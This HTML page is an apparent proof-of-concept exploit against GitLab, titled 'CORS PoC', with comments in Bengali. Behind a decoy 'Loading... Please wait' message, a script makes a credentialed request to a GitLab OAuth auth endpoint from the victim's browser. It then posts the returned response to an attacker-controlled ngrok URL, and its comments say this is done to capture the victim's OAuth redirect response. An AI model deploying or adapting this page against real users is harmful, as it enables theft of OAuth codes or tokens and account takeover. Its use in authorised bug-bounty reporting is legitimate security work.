<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC - GitLab</title>
</head>
<body>
  <h2>Loading... Please wait</h2>

  <script>
    // ভিক্টিমের ব্রাউজার থেকে GitLab OAuth redirect রেসপন্স নিয়ে তোমার ngrok সার্ভারে পাঠানো হবে
    fetch("https://projects.gitlab.io/auth?domain=https://docs.gitlab.com&state=iKOkN_x-pvhbvNdNe3Ra1g==", {
      method: "GET",
      credentials: "include"
    })
    .then(response => response.text())
    .then(data => {
      // তোমার ngrok endpoint এ POST করে পাঠাবে
      fetch("https://584b8b34f84d.ngrok-free.app", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain"
        },
        body: data
      });
    })
    .catch(error => {
      document.body.innerHTML += "<pre>Request failed: " + error + "</pre>";
    });
  </script>
</body>
</html>
